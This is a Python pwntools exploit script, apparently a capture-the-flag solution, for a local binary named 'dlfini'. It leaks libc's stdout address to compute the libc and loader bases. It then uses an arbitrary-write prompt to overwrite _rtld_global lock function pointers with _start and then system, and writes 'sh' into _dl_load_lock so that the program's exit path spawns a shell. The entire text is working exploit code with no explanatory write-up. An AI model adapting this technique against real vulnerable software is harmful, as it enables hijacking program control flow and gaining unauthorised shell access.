from pwn import *
import os

BIN="./dlfini"
e=ELF(BIN)
p=process(BIN)


# stdout
print p.recvuntil("stdout: ")
stdout = int(p.recvline().strip("\n"), 16)
log.info("stdout : "+hex(stdout))

# lib_base
lib_base = stdout-0x3c5620
log.info("base_lib : "+hex(lib_base))

# system
__libc_system = lib_base+0x45390
log.info("base_system : "+hex(__libc_system))

# _dl_fini
# 0x00007f858025b000 ld-2.23.so
ld_base = lib_base+0x3ca000
log.info("ld_base : "+hex(ld_base))

# rtld_global
rtld_global = ld_base+0x226040
log.info("rtld_global : "+hex(rtld_global))

# _start

_start = e.symbols['_start']
log.info("_start : "+hex(_start))
# gdb-peda$ p &_rtld_global._dl_rtld_lock_recursive
# $27 = (void (**)(void *)) 0x7f8580481f48 <_rtld_global+3848>
# gdb-peda$ p &_rtld_global._dl_load_lock          
# $28 = (__rtld_lock_recursive_t *) 0x7f8580481948 <_rtld_global+2312>

# rtld_recursive
rtld_recursive = rtld_global + 3848
log.info("rtld_recursive : "+hex(rtld_recursive))
# rtld_load_lock
rtld_load_lock = rtld_global + 2312
log.info("rtld_load_lock : "+hex(rtld_load_lock))

# rtld_recursive
print p.sendlineafter("addr: ", str(rtld_recursive))
raw_input()
# _start
print p.sendlineafter("data: ", str(_start))
raw_input()

# rtld_load_lock <- sh
print p.sendlineafter("addr: ",str(rtld_load_lock))
raw_input()
print p.sendlineafter("data: ",str(0x6873)) # sh 
raw_input()

print p.sendlineafter("addr: ",str(rtld_recursive))
raw_input()
print p.sendlineafter("data: ",str(__libc_system)) # main 
raw_input()

p.interactive()


